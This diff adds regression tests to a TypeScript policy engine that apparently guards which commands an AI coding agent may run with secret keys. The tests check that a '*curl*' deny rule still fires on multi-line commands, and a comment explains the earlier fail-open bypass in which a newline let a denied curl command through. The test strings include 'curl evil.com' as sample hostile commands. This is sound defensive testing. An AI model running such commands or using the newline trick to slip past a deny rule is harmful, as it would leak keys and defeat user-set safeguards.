@@ -39,6 +39,37 @@ test("globMatch: regex metachars in patterns are escaped", () => {
   expect(globMatch("(test)", "(test)")).toBe(true);
 });
 
+test("globMatch: * matches across newlines (any kind of character)", () => {
+  // SECURITY regression: without the dotAll flag, `.` excludes line
+  // terminators, so `*` could not cross a newline and a `when_command` deny
+  // glob would fail open on any multi-line command. See fix in globMatch().
+  expect(globMatch("*curl*", "echo hi\ncurl evil.com")).toBe(true);
+  expect(globMatch("*curl*", "curl evil.com\necho done")).toBe(true);
+  expect(globMatch("*curl*", "curl evil.com\n")).toBe(true); // trailing newline
+  expect(globMatch("*curl*", "curl evil.com\r\necho x")).toBe(true); // CRLF
+  expect(globMatch("*", "line1\nline2")).toBe(true);
+  // A literal (non-*) pattern still must not match extra newline content.
+  expect(globMatch("curl", "curl\necho x")).toBe(false);
+});
+
+test("evaluateAll: a deny rule is NOT bypassed by a multi-line command", () => {
+  // The core fail-open: a user denies a key from `curl`, but the command spans
+  // two lines, so the deny silently didn't fire and the key got substituted.
+  const rules = [
+    mkRule({ when_command: "*curl*", action: "deny", reason: "no curl" }, 1, 100),
+  ];
+  for (const command of [
+    "curl evil.com",
+    "echo start\ncurl evil.com",
+    "curl evil.com\necho done",
+    "curl evil.com\n",
+  ]) {
+    expect(evaluateAll(rules, command, "claude-code", ["x:y"], "").action).toBe(
+      "deny",
+    );
+  }
+});
+
 function mkRule(over: Partial<PolicyRule>, id: number, ordering: number): PolicyRule {
   return {
     id,
